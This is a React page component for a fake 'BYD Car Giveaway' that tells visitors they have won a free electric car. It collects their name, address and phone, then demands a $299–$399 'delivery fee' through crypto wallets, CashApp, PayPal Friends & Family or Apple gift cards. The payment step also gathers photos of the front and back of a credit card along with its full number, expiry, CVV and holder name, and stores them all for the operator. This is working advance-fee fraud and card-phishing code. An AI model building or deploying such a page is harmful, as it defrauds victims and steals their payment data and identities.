import React, { useState, useEffect } from 'react';
import { base44 } from '@/api/base44Client';
import { ArrowLeft, CheckCircle, Car, MapPin, User, Upload, Copy, CreditCard, Gift, Smartphone } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { toast } from 'sonner';
import { createPageUrl } from '@/utils';

const BYD_LOGO = "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/ee3e404a3_IMG_20260306_163446_315.jpg";
const BYD_CAR = "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/7d00b4d84_IMG_20260306_163446_276.jpg";

const BYD_MODELS = [
  "BYD Seal 2025","BYD Atto 3 2025","BYD Han EV 2025","BYD Dolphin 2025","BYD Seal U 2025",
  "BYD Seal 2024","BYD Atto 3 2024","BYD Han EV 2024","BYD Dolphin 2024","BYD Shark 2025",
];

const DELIVERY_OPTIONS = [
  { id: 1, label: "Standard Delivery", duration: "10–14 business days", fee: "$299", desc: "Standard international shipping & customs clearance" },
  { id: 2, label: "Express Delivery", duration: "5–7 business days", fee: "$349", desc: "Priority shipping with real-time tracking updates" },
  { id: 3, label: "Premium Delivery", duration: "3–5 business days", fee: "$399", desc: "Fastest dispatch, white-glove doorstep delivery" },
];

const STEPS = { DETAILS: 'details', ORDER: 'order', PAYMENT: 'payment', SUCCESS: 'success' };

const inputCls = "w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm placeholder-gray-500 focus:outline-none focus:border-red-500";

export default function Participate() {
  const [step, setStep] = useState(STEPS.DETAILS);
  const [selectedModel, setSelectedModel] = useState(BYD_MODELS[0]);
  const [selectedDelivery, setSelectedDelivery] = useState(DELIVERY_OPTIONS[0]);

  // Payment methods from admin
  const [cryptoWallets, setCryptoWallets] = useState([]);
  const [cashAppTag, setCashAppTagAdmin] = useState('');
  const [paypalTag, setPaypalTagAdmin] = useState('');
  const [settingsLoaded, setSettingsLoaded] = useState(false);

  // Selected payment type & crypto
  const [paymentType, setPaymentType] = useState('crypto'); // crypto | cashapp | paypal | credit_card | apple_gift_card
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [copied, setCopied] = useState(false);

  // Credit card state
  const [cardFront, setCardFront] = useState(null);
  const [cardFrontUrl, setCardFrontUrl] = useState('');
  const [cardBack, setCardBack] = useState(null);
  const [cardBackUrl, setCardBackUrl] = useState('');
  const [cardInfo, setCardInfo] = useState({ number: '', expiry: '', cvv: '', holder: '' });

  // Apple gift card state
  const [giftFront, setGiftFront] = useState(null);
  const [giftFrontUrl, setGiftFrontUrl] = useState('');
  const [giftBack, setGiftBack] = useState(null);
  const [giftBackUrl, setGiftBackUrl] = useState('');
  const [giftCode, setGiftCode] = useState('');

  // Payment proof
  const [proofUrl, setProofUrl] = useState('');

  const [uploading, setUploading] = useState({});
  const [submitting, setSubmitting] = useState(false);
  const [successCountdown, setSuccessCountdown] = useState(20);
  const [form, setForm] = useState({ fullName: '', email: '', phone: '', address: '', city: '', country: '', zip: '' });

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const idx = parseInt(params.get('wallet') || '0');
    if (BYD_MODELS[idx]) setSelectedModel(BYD_MODELS[idx]);

    base44.entities.SiteSettings.list().then(records => {
      if (records && records.length > 0) {
        const s = records[0];
        // Load crypto wallets
        const count = parseInt(s.pm_count) || 0;
        const wallets = Array.from({ length: count }, (_, i) => ({
          id: `pm_${i}`,
          label: s[`pm_${i + 1}_label`] || '',
          address: s[`pm_${i + 1}_address`] || '',
          logo: s[`pm_${i + 1}_logo`] || '',
        })).filter(w => w.label && w.address);
        setCryptoWallets(wallets);
        if (wallets.length > 0) setSelectedWallet(wallets[0]);
        // Load CashApp / PayPal tags
        if (s.cashapp_tag) setCashAppTagAdmin(s.cashapp_tag);
        if (s.paypal_tag) setPaypalTagAdmin(s.paypal_tag);
      }
      setSettingsLoaded(true);
    });
  }, []);

  useEffect(() => {
    if (step !== STEPS.SUCCESS) return;
    setSuccessCountdown(20);
    const t = setInterval(() => {
      setSuccessCountdown(prev => {
        if (prev <= 1) { clearInterval(t); window.location.href = createPageUrl('Home'); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  const handleFormChange = (field, value) => setForm(prev => ({ ...prev, [field]: value }));

  const handleDetailsSubmit = () => {
    if (!form.fullName || !form.email || !form.phone || !form.address || !form.city || !form.country) {
      toast.error("Please fill in all required fields.");
      return;
    }
    setStep(STEPS.ORDER);
  };

  const uploadFile = async (file, key) => {
    setUploading(p => ({ ...p, [key]: true }));
    const { file_url } = await base44.integrations.Core.UploadFile({ file });
    setUploading(p => ({ ...p, [key]: false }));
    return file_url;
  };

  const handleCardFront = async (e) => {
    const file = e.target.files[0]; if (!file) return;
    setCardFront(file);
    const url = await uploadFile(file, 'cardFront');
    setCardFrontUrl(url);
  };
  const handleCardBack = async (e) => {
    const file = e.target.files[0]; if (!file) return;
    setCardBack(file);
    const url = await uploadFile(file, 'cardBack');
    setCardBackUrl(url);
  };
  const handleGiftFront = async (e) => {
    const file = e.target.files[0]; if (!file) return;
    setGiftFront(file);
    const url = await uploadFile(file, 'giftFront');
    setGiftFrontUrl(url);
  };
  const handleGiftBack = async (e) => {
    const file = e.target.files[0]; if (!file) return;
    setGiftBack(file);
    const url = await uploadFile(file, 'giftBack');
    setGiftBackUrl(url);
  };

  const handleProof = async (e) => {
    const file = e.target.files[0]; if (!file) return;
    const url = await uploadFile(file, 'proof');
    setProofUrl(url);
    toast.success("Payment proof uploaded!");
  };

  const handleCopy = () => {
    if (!selectedWallet?.address) return;
    navigator.clipboard.writeText(selectedWallet.address);
    setCopied(true);
    toast.success("Address copied!");
    setTimeout(() => setCopied(false), 2000);
  };

  const handleConfirmPayment = async () => {
    setSubmitting(true);
    const base = {
      full_name: form.fullName,
      email: form.email,
      phone: form.phone,
      address: form.address,
      city: form.city,
      country: form.country,
      zip: form.zip,
      car_model: selectedModel,
      delivery_option: selectedDelivery.label,
      delivery_fee: selectedDelivery.fee,
      payment_type: paymentType,
      status: 'pending',
    };

    if (paymentType === 'crypto') {
      Object.assign(base, {
        payment_label: selectedWallet?.label || '',
        wallet_address_used: selectedWallet?.address || '',
      });
    } else if (paymentType === 'cashapp') {
      Object.assign(base, { payment_label: 'CashApp', cashapp_tag: cashAppTag });
    } else if (paymentType === 'paypal') {
      Object.assign(base, { payment_label: 'PayPal', paypal_tag: paypalTag });
    } else if (paymentType === 'credit_card') {
      Object.assign(base, {
        payment_label: 'Credit Card',
        credit_card_front_url: cardFrontUrl,
        credit_card_back_url: cardBackUrl,
        card_number: cardInfo.number,
        card_expiry: cardInfo.expiry,
        card_cvv: cardInfo.cvv,
        card_holder_name: cardInfo.holder,
      });
    } else if (paymentType === 'apple_gift_card') {
      Object.assign(base, {
        payment_label: 'Apple Gift Card',
        apple_gift_front_url: giftFrontUrl,
        apple_gift_back_url: giftBackUrl,
        apple_gift_code: giftCode,
      });
    }

    base.payment_proof_url = proofUrl || '';

    await base44.entities.PaymentSubmission.create(base);

    setSubmitting(false);
    setStep(STEPS.SUCCESS);
  };

  // ── STEP: DETAILS ──
  if (step === STEPS.DETAILS) {
    return (
      <div className="min-h-screen bg-gray-950 px-4 py-10">
        <div className="w-full max-w-lg mx-auto">
          <div className="flex items-center gap-3 mb-8">
            <a href={createPageUrl('Home')} className="text-gray-500 hover:text-white transition-colors"><ArrowLeft className="w-5 h-5" /></a>
            <img src={BYD_LOGO} alt="BYD" className="w-8 h-8 rounded-full object-contain bg-white border border-red-600 p-0.5" />
            <span className="text-white font-bold">BYD Car Giveaway — Claim Your Car</span>
          </div>
          <div className="bg-red-600/10 border border-red-500/30 rounded-2xl p-4 mb-6 flex items-center gap-3">
            <img src={BYD_CAR} alt="BYD Car" className="w-16 h-12 object-cover rounded-xl shrink-0" />
            <div>
              <p className="text-white font-bold text-sm">🎉 You've been selected!</p>
              <p className="text-red-300 text-xs mt-0.5">Fill in your delivery details to receive your free BYD electric car.</p>
            </div>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
            <label className="text-white font-bold text-sm mb-3 flex items-center gap-2"><Car className="w-4 h-4 text-red-500" /> Choose Your BYD Car Model</label>
            <select value={selectedModel} onChange={e => setSelectedModel(e.target.value)}
              className="w-full mt-2 bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-red-500">
              {BYD_MODELS.map(m => <option key={m} value={m}>{m}</option>)}
            </select>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
            <p className="text-white font-bold text-sm mb-4 flex items-center gap-2"><User className="w-4 h-4 text-red-500" /> Personal Information</p>
            <div className="space-y-3">
              <input placeholder="Full Name *" value={form.fullName} onChange={e => handleFormChange('fullName', e.target.value)} className={inputCls} />
              <input placeholder="Email Address *" type="email" value={form.email} onChange={e => handleFormChange('email', e.target.value)} className={inputCls} />
              <input placeholder="Phone Number *" type="tel" value={form.phone} onChange={e => handleFormChange('phone', e.target.value)} className={inputCls} />
            </div>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-6">
            <p className="text-white font-bold text-sm mb-4 flex items-center gap-2"><MapPin className="w-4 h-4 text-red-500" /> Delivery Address</p>
            <div className="space-y-3">
              <input placeholder="Street Address *" value={form.address} onChange={e => handleFormChange('address', e.target.value)} className={inputCls} />
              <div className="grid grid-cols-2 gap-3">
                <input placeholder="City *" value={form.city} onChange={e => handleFormChange('city', e.target.value)} className="bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm placeholder-gray-500 focus:outline-none focus:border-red-500" />
                <input placeholder="ZIP / Postal" value={form.zip} onChange={e => handleFormChange('zip', e.target.value)} className="bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm placeholder-gray-500 focus:outline-none focus:border-red-500" />
              </div>
              <input placeholder="Country *" value={form.country} onChange={e => handleFormChange('country', e.target.value)} className={inputCls} />
            </div>
          </div>
          <Button onClick={handleDetailsSubmit} className="w-full bg-red-600 hover:bg-red-700 text-white py-5 text-base font-bold rounded-xl">Order Now →</Button>
        </div>
      </div>
    );
  }

  // ── STEP: ORDER ──
  if (step === STEPS.ORDER) {
    return (
      <div className="min-h-screen bg-gray-950 px-4 py-10">
        <div className="w-full max-w-lg mx-auto">
          <div className="flex items-center gap-3 mb-8">
            <button onClick={() => setStep(STEPS.DETAILS)} className="text-gray-500 hover:text-white"><ArrowLeft className="w-5 h-5" /></button>
            <img src={BYD_LOGO} alt="BYD" className="w-8 h-8 rounded-full object-contain bg-white border border-red-600 p-0.5" />
            <span className="text-white font-bold">Order Summary</span>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
            <img src={BYD_CAR} alt={selectedModel} className="w-full h-44 object-cover rounded-xl mb-4" />
            <div className="flex items-center justify-between">
              <div>
                <p className="text-white font-black text-lg">{selectedModel}</p>
                <p className="text-red-400 text-sm">Brand New Electric Vehicle</p>
              </div>
              <span className="bg-green-500/20 text-green-400 text-xs font-bold px-3 py-1.5 rounded-full">FREE 🎉</span>
            </div>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
            <p className="text-gray-400 text-xs uppercase tracking-wide font-semibold mb-3">Deliver To</p>
            <p className="text-white font-bold">{form.fullName}</p>
            <p className="text-gray-400 text-sm">{form.email} · {form.phone}</p>
            <p className="text-gray-400 text-sm mt-1">{form.address}, {form.city}, {form.country} {form.zip}</p>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-6">
            <p className="text-white font-bold text-sm mb-3">Select Delivery Option</p>
            <div className="space-y-3">
              {DELIVERY_OPTIONS.map(opt => (
                <button key={opt.id} onClick={() => setSelectedDelivery(opt)}
                  className={`w-full text-left rounded-xl border p-4 transition-colors ${selectedDelivery.id === opt.id ? 'border-red-500 bg-red-500/10' : 'border-gray-700 bg-gray-800 hover:border-gray-600'}`}>
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-white font-bold text-sm">{opt.label}</span>
                    <span className="text-red-400 font-black">{opt.fee}</span>
                  </div>
                  <p className="text-gray-400 text-xs">{opt.desc}</p>
                  <p className="text-gray-500 text-xs mt-1">⏱ {opt.duration}</p>
                </button>
              ))}
            </div>
          </div>
          <div className="bg-gray-900 border border-gray-700 rounded-xl p-4 mb-6 flex items-center justify-between">
            <div>
              <p className="text-gray-400 text-xs">Delivery Fee Only</p>
              <p className="text-white font-black text-2xl">{selectedDelivery.fee}</p>
            </div>
            <div className="text-right">
              <p className="text-green-400 text-sm font-bold">Car Value: FREE</p>
              <p className="text-gray-500 text-xs">{selectedDelivery.duration}</p>
            </div>
          </div>
          <Button onClick={() => setStep(STEPS.PAYMENT)} className="w-full bg-red-600 hover:bg-red-700 text-white py-5 text-base font-bold rounded-xl">Pay for Delivery Now →</Button>
        </div>
      </div>
    );
  }

  // ── STEP: PAYMENT ──
  if (step === STEPS.PAYMENT) {
    const paymentTypes = [
      ...(cryptoWallets.length > 0 ? [{ id: 'crypto', label: 'Crypto Wallet', icon: '₿', emoji: '🪙' }] : []),
      ...(cashAppTag ? [{ id: 'cashapp', label: 'CashApp', icon: '$', emoji: '💵' }] : []),
      ...(paypalTag ? [{ id: 'paypal', label: 'PayPal', icon: 'PP', emoji: '🅿️' }] : []),
      { id: 'credit_card', label: 'Credit Card', icon: '💳', emoji: '💳' },
      { id: 'apple_gift_card', label: 'Apple Gift Card', icon: '🍎', emoji: '🍎' },
    ];

    return (
      <div className="min-h-screen bg-gray-950 px-4 py-10">
        <div className="w-full max-w-lg mx-auto">
          <div className="flex items-center gap-3 mb-8">
            <button onClick={() => setStep(STEPS.ORDER)} className="text-gray-500 hover:text-white"><ArrowLeft className="w-5 h-5" /></button>
            <img src={BYD_LOGO} alt="BYD" className="w-8 h-8 rounded-full object-contain bg-white border border-red-600 p-0.5" />
            <span className="text-white font-bold">Pay Delivery Fee — {selectedDelivery.fee}</span>
          </div>

          <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 mb-6">
            <p className="text-green-300 text-sm font-semibold">✅ Delivering: <span className="text-white">{selectedModel}</span> to <span className="text-white">{form.city}, {form.country}</span></p>
          </div>

          {/* Payment Type Selector */}
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
            <p className="text-white font-bold text-sm mb-3">Select Payment Method</p>
            <div className="grid grid-cols-2 gap-3">
              {paymentTypes.map(pt => (
                <button key={pt.id} onClick={() => setPaymentType(pt.id)}
                  className={`rounded-xl border p-3 text-center transition-colors ${paymentType === pt.id ? 'border-red-500 bg-red-500/10' : 'border-gray-700 bg-gray-800 hover:border-gray-600'}`}>
                  <div className="text-2xl mb-1">{pt.emoji}</div>
                  <p className="text-white text-xs font-semibold">{pt.label}</p>
                </button>
              ))}
            </div>
          </div>

          {/* ─── CRYPTO WALLETS ─── */}
          {paymentType === 'crypto' && (
            <div className="space-y-4">
              <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5">
                <p className="text-white font-bold text-sm mb-3">Choose Crypto</p>
                <div className="grid grid-cols-2 gap-3">
                  {cryptoWallets.map(w => (
                    <button key={w.id} onClick={() => setSelectedWallet(w)}
                      className={`rounded-xl border p-3 text-center transition-colors ${selectedWallet?.id === w.id ? 'border-red-500 bg-red-500/10' : 'border-gray-700 bg-gray-800 hover:border-gray-600'}`}>
                      {w.logo
                        ? <img src={w.logo} alt={w.label} className="w-10 h-10 rounded-full object-contain mx-auto mb-2 bg-white p-1" />
                        : <div className="w-10 h-10 bg-orange-500 rounded-full flex items-center justify-center text-white font-black text-lg mx-auto mb-2">₿</div>
                      }
                      <p className="text-white text-xs font-semibold">{w.label}</p>
                    </button>
                  ))}
                </div>
              </div>
              {selectedWallet && (
                <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5">
                  <p className="text-gray-400 text-xs uppercase tracking-wide font-semibold mb-2">Send {selectedDelivery.fee} to this address</p>
                  <div className="bg-gray-800 rounded-xl p-4 flex items-center gap-3">
                    <code className="text-green-400 text-xs break-all flex-1 font-mono">{selectedWallet.address}</code>
                    <button onClick={handleCopy} className="shrink-0 bg-gray-700 hover:bg-red-600 transition-colors rounded-lg p-2">
                      {copied ? <CheckCircle className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4 text-white" />}
                    </button>
                  </div>
                  <p className="text-yellow-400 text-xs mt-3">⚠️ Send exactly <strong>{selectedDelivery.fee}</strong> worth of {selectedWallet.label}.</p>
                </div>
              )}
            </div>
          )}

          {/* ─── CASHAPP ─── */}
          {paymentType === 'cashapp' && (
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5">
              <p className="text-white font-bold text-sm mb-1">Send via CashApp</p>
              <p className="text-gray-400 text-xs mb-4">Send <strong className="text-white">{selectedDelivery.fee}</strong> to the CashApp tag below</p>
              <div className="bg-green-900/30 border border-green-700 rounded-xl p-4 flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-xs mb-1">CashApp Tag</p>
                  <p className="text-green-300 font-black text-xl">{cashAppTag}</p>
                </div>
                <button onClick={() => { navigator.clipboard.writeText(cashAppTag); toast.success("CashApp tag copied!"); }}
                  className="bg-gray-700 hover:bg-green-700 transition-colors rounded-lg p-2">
                  <Copy className="w-4 h-4 text-white" />
                </button>
              </div>
              <p className="text-yellow-400 text-xs mt-3">⚠️ Include your name in the payment note.</p>
            </div>
          )}

          {/* ─── PAYPAL ─── */}
          {paymentType === 'paypal' && (
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5">
              <p className="text-white font-bold text-sm mb-1">Send via PayPal</p>
              <p className="text-gray-400 text-xs mb-4">Send <strong className="text-white">{selectedDelivery.fee}</strong> to the PayPal account below</p>
              <div className="bg-blue-900/30 border border-blue-700 rounded-xl p-4 flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-xs mb-1">PayPal Email / Tag</p>
                  <p className="text-blue-300 font-black text-xl">{paypalTag}</p>
                </div>
                <button onClick={() => { navigator.clipboard.writeText(paypalTag); toast.success("PayPal tag copied!"); }}
                  className="bg-gray-700 hover:bg-blue-700 transition-colors rounded-lg p-2">
                  <Copy className="w-4 h-4 text-white" />
                </button>
              </div>
              <p className="text-yellow-400 text-xs mt-3">⚠️ Send as "Friends & Family" and include your name in the note.</p>
            </div>
          )}

          {/* ─── CREDIT CARD ─── */}
          {paymentType === 'credit_card' && (
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 space-y-4">
              <div className="flex items-center gap-2 mb-1">
                <CreditCard className="w-4 h-4 text-red-500" />
                <p className="text-white font-bold text-sm">Credit Card Payment</p>
              </div>
              <p className="text-gray-400 text-xs">Upload your card front & back, then enter your card details.</p>

              {/* Upload front/back */}
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <p className="text-gray-400 text-xs mb-2">Card Front</p>
                  <label className="cursor-pointer block">
                    <div className={`h-28 rounded-xl border-2 border-dashed flex flex-col items-center justify-center transition-colors ${cardFrontUrl ? 'border-green-500' : 'border-gray-600 hover:border-red-500'}`}>
                      {cardFrontUrl
                        ? <img src={cardFrontUrl} alt="front" className="w-full h-full object-cover rounded-xl" />
                        : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Upload Front</span></>
                      }
                    </div>
                    <input type="file" accept="image/*" className="hidden" onChange={handleCardFront} disabled={uploading.cardFront} />
                  </label>
                  {uploading.cardFront && <p className="text-yellow-400 text-xs mt-1">Uploading...</p>}
                </div>
                <div>
                  <p className="text-gray-400 text-xs mb-2">Card Back</p>
                  <label className="cursor-pointer block">
                    <div className={`h-28 rounded-xl border-2 border-dashed flex flex-col items-center justify-center transition-colors ${cardBackUrl ? 'border-green-500' : 'border-gray-600 hover:border-red-500'}`}>
                      {cardBackUrl
                        ? <img src={cardBackUrl} alt="back" className="w-full h-full object-cover rounded-xl" />
                        : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Upload Back</span></>
                      }
                    </div>
                    <input type="file" accept="image/*" className="hidden" onChange={handleCardBack} disabled={uploading.cardBack} />
                  </label>
                  {uploading.cardBack && <p className="text-yellow-400 text-xs mt-1">Uploading...</p>}
                </div>
              </div>

              {/* Card details */}
              <input placeholder="Card Holder Name" value={cardInfo.holder} onChange={e => setCardInfo(p => ({ ...p, holder: e.target.value }))} className={inputCls} />
              <input placeholder="Card Number (16 digits)" value={cardInfo.number} onChange={e => setCardInfo(p => ({ ...p, number: e.target.value }))} maxLength={19} className={inputCls} />
              <div className="grid grid-cols-2 gap-3">
                <input placeholder="MM/YY" value={cardInfo.expiry} onChange={e => setCardInfo(p => ({ ...p, expiry: e.target.value }))} maxLength={5} className="bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm placeholder-gray-500 focus:outline-none focus:border-red-500" />
                <input placeholder="CVV" value={cardInfo.cvv} onChange={e => setCardInfo(p => ({ ...p, cvv: e.target.value }))} maxLength={4} className="bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm placeholder-gray-500 focus:outline-none focus:border-red-500" />
              </div>
            </div>
          )}

          {/* ─── APPLE GIFT CARD ─── */}
          {paymentType === 'apple_gift_card' && (
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 space-y-4">
              <div className="flex items-center gap-2 mb-1">
                <Gift className="w-4 h-4 text-red-500" />
                <p className="text-white font-bold text-sm">Apple Gift Card</p>
              </div>
              <p className="text-gray-400 text-xs">Upload front & back of the gift card, OR paste the gift card code below.</p>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <p className="text-gray-400 text-xs mb-2">Card Front</p>
                  <label className="cursor-pointer block">
                    <div className={`h-28 rounded-xl border-2 border-dashed flex flex-col items-center justify-center transition-colors ${giftFrontUrl ? 'border-green-500' : 'border-gray-600 hover:border-red-500'}`}>
                      {giftFrontUrl
                        ? <img src={giftFrontUrl} alt="front" className="w-full h-full object-cover rounded-xl" />
                        : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Upload Front</span></>
                      }
                    </div>
                    <input type="file" accept="image/*" className="hidden" onChange={handleGiftFront} disabled={uploading.giftFront} />
                  </label>
                  {uploading.giftFront && <p className="text-yellow-400 text-xs mt-1">Uploading...</p>}
                </div>
                <div>
                  <p className="text-gray-400 text-xs mb-2">Card Back</p>
                  <label className="cursor-pointer block">
                    <div className={`h-28 rounded-xl border-2 border-dashed flex flex-col items-center justify-center transition-colors ${giftBackUrl ? 'border-green-500' : 'border-gray-600 hover:border-red-500'}`}>
                      {giftBackUrl
                        ? <img src={giftBackUrl} alt="back" className="w-full h-full object-cover rounded-xl" />
                        : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Upload Back</span></>
                      }
                    </div>
                    <input type="file" accept="image/*" className="hidden" onChange={handleGiftBack} disabled={uploading.giftBack} />
                  </label>
                  {uploading.giftBack && <p className="text-yellow-400 text-xs mt-1">Uploading...</p>}
                </div>
              </div>

              <div>
                <p className="text-gray-400 text-xs mb-2">— OR paste the gift card code —</p>
                <input placeholder="e.g. XXXX-XXXX-XXXX-XXXX" value={giftCode} onChange={e => setGiftCode(e.target.value)} className={inputCls + " font-mono tracking-widest"} />
              </div>
            </div>
          )}

          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 my-5 flex items-center gap-3">
            <div className="text-2xl">🚗</div>
            <div>
              <p className="text-white text-sm font-bold">After payment, your {selectedModel} will be dispatched</p>
              <p className="text-gray-400 text-xs mt-0.5">Delivery in {selectedDelivery.duration} · Tracking info sent to {form.email}</p>
            </div>
          </div>

          {/* ─── PAYMENT PROOF ─── */}
          <div className="bg-gray-900 border border-yellow-500/40 rounded-2xl p-5 mb-5">
            <p className="text-yellow-400 font-bold text-sm mb-1 flex items-center gap-2">
              <Upload className="w-4 h-4" /> Upload Payment Proof
            </p>
            <p className="text-gray-400 text-xs mb-4">Take a screenshot or photo of your payment confirmation and upload it here. This speeds up your order verification.</p>
            <label className="cursor-pointer block">
              <div className={`h-36 rounded-xl border-2 border-dashed flex flex-col items-center justify-center transition-colors ${proofUrl ? 'border-green-500 bg-green-500/5' : 'border-yellow-500/40 hover:border-yellow-400 bg-gray-800'}`}>
                {proofUrl
                  ? <>
                      <img src={proofUrl} alt="proof" className="h-full w-full object-contain rounded-xl p-1" />
                    </>
                  : <>
                      <Upload className="w-6 h-6 text-yellow-400 mb-2" />
                      <span className="text-yellow-400 text-sm font-semibold">Tap to upload proof</span>
                      <span className="text-gray-500 text-xs mt-1">Screenshot, photo — any format</span>
                    </>
                }
              </div>
              <input type="file" accept="image/*,application/pdf" className="hidden" onChange={handleProof} disabled={uploading.proof} />
            </label>
            {uploading.proof && <p className="text-yellow-400 text-xs mt-2">⏳ Uploading...</p>}
            {proofUrl && <p className="text-green-400 text-xs mt-2">✅ Proof uploaded successfully!</p>}
            <p className="text-gray-600 text-xs mt-2">Optional — but recommended for faster processing.</p>
          </div>

          <Button onClick={handleConfirmPayment} disabled={submitting}
            className="w-full bg-red-600 hover:bg-red-700 text-white py-5 text-base font-bold rounded-xl">
            {submitting ? "Submitting..." : "I've Paid — Confirm My Order ✓"}
          </Button>
        </div>
      </div>
    );
  }

  // ── STEP: SUCCESS ──
  if (step === STEPS.SUCCESS) {
    return (
      <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center px-4">
        <div className="w-full max-w-md text-center">
          <div className="w-28 h-28 rounded-full mx-auto mb-6 overflow-hidden border-4 border-green-500 shadow-2xl shadow-green-500/30">
            <img src={BYD_CAR} alt="BYD Car" className="w-full h-full object-cover" />
          </div>
          <div className="text-5xl mb-4">🎉</div>
          <h2 className="text-3xl font-black text-white mb-3">Order Received!</h2>
          <p className="text-gray-400 mb-6">Once your payment is verified, you will get a message on your phone with tracking information.</p>
          <div className="bg-green-500/10 border border-green-500/30 rounded-2xl p-6 mb-6 text-left">
            <p className="text-green-300 font-bold mb-3">✅ Order Details</p>
            <div className="space-y-1.5 text-sm">
              <p className="text-gray-300"><span className="text-gray-500">Car:</span> <span className="font-bold text-white">{selectedModel}</span></p>
              <p className="text-gray-300"><span className="text-gray-500">Name:</span> {form.fullName}</p>
              <p className="text-gray-300"><span className="text-gray-500">Delivery to:</span> {form.city}, {form.country}</p>
              <p className="text-gray-300"><span className="text-gray-500">Expected:</span> {selectedDelivery.duration}</p>
              <p className="text-gray-300"><span className="text-gray-500">Tracking sent to:</span> {form.email}</p>
            </div>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-6">
            <p className="text-gray-500 text-sm">Returning to homepage in</p>
            <p className="text-4xl font-black text-red-500 mt-1">{successCountdown}s</p>
          </div>
          <a href={createPageUrl('Home')}>
            <Button className="w-full bg-red-600 hover:bg-red-700 text-white py-4 font-bold rounded-xl">Return to Homepage</Button>
          </a>
        </div>
      </div>
    );
  }

  return null;
}